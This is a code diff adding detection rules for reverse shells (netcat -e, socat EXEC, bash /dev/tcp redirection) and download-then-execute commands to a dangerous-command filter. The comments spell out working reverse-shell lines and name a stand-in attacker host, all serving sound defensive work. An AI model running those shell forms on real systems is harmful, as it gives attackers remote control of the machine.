@@ -289,6 +289,49 @@ DANGEROUS_PATTERNS = [
     # a script is first made executable then immediately run. The script
     # content may contain dangerous commands that individual patterns miss.
     (r'\bchmod\s+\+x\b.*[;&|]+\s*\./', "chmod +x followed by immediate execution"),
+    # Reverse-shell-via-flag patterns. The existing `bash -c` / `python -c` /
+    # heredoc / `curl | sh` rules catch most shell-bootstrap shapes, but the
+    # standard offensive-tooling reverse shells use a flag that asks the
+    # network tool itself to spawn a shell — `nc -e /bin/bash`, `ncat -e sh`,
+    # `socat EXEC:/bin/bash` — without ever invoking bash on the command
+    # line. Catch them by the flag/keyword regardless of host (the IP-based
+    # variants in some adjacent proposals miss hostnames like `evil.example.com`).
+    # Flag-then-arg forms like `nc -p 1234 -e /bin/sh` need an optional
+    # non-flag argument after each leading flag; the `(?!-)` lookahead keeps
+    # the iteration from swallowing the `-e` token itself, and the engine
+    # backtracks if it tries to consume `-e` as a flag-arg pair.
+    (r'\b(nc|ncat)\s+(?:(?:-[^\s]+)(?:\s+(?!-)\S+)?\s+)*-e\s+(?:\S*/)?(?:bash|sh|zsh|ksh|dash)\b',
+     "reverse shell via netcat -e"),
+    # Use `.*` (DOTALL is on globally) instead of `[^\n]*` so shell line
+    # continuations (`socat \<newline>EXEC:/bin/bash`) cannot bypass detection.
+    # `(?:\S*/)?` accepts arbitrary path prefixes (e.g. `/usr/bin/bash`).
+    (r'\bsocat\b.*\bEXEC\s*:\s*["\']?(?:\S*/)?(?:bash|sh|zsh|ksh|dash)\b',
+     "reverse shell via socat EXEC"),
+    # Bash `/dev/tcp` (and `/dev/udp`) redirection-style reverse shell. The
+    # canonical `bash -i >& /dev/tcp/<host>/<port> 0>&1` form spawns a shell
+    # whose stdio is wired to a TCP socket without `-e` / `EXEC:` / `bash -c`,
+    # so the existing reverse-shell-via-flag and shell-bootstrap rules miss
+    # it. Anchor on the redirection target (`[<>]` followed by an optional
+    # `&` / fd-number then `/dev/tcp/` or `/dev/udp/`) rather than the shell
+    # name — that catches the explicit-FD variants too:
+    #   * `bash -i >& /dev/tcp/host/4444 0>&1`            (canonical)
+    #   * `bash -i 5<>/dev/tcp/host/4444 0<&5 1>&5 2>&5`  (numeric FD)
+    #   * `exec 196<>/dev/tcp/host/4444; sh <&196 >&196`  (raw exec)
+    # Common benign usage stays safe: bare `/dev/tcp/` mentions (`grep
+    # '/dev/tcp/' logs.txt`) lack a `[<>]` anchor immediately before the
+    # path, and unrelated `>` redirections (`echo hi > out.txt`) lack the
+    # `/dev/(tcp|udp)/` target.
+    (r'[<>]\s*&?\s*\d*\s*/dev/(?:tcp|udp)/',
+     "reverse shell via /dev/tcp redirection"),
+    # Two-stage download-then-execute. `curl URL | bash` (pipe-to-shell) is
+    # already caught above, but the trivial syntactic variant `curl -o file
+    # && bash file` (or `; bash file`, `| chmod +x ... ; ./file`) is not.
+    # Same threat model, no new bypass surface.
+    # `\s*` after `-[oO]` allows the no-space form `-o/tmp/p.sh` / `-Ofoo.sh`.
+    # `.*` segments cross newlines under DOTALL so `\<newline>` continuations
+    # cannot bypass detection. `(?:\S*/)?` covers `/usr/bin/bash` etc.
+    (r'\b(?:curl|wget)\b.*\s-[oO]\s*\S+.*[;&|]+\s*(?:(?:(?:\S*/)?(?:bash|sh|zsh|ksh|dash))\b|chmod\s+\+x\b)',
+     "download then execute"),
 ]
 
 
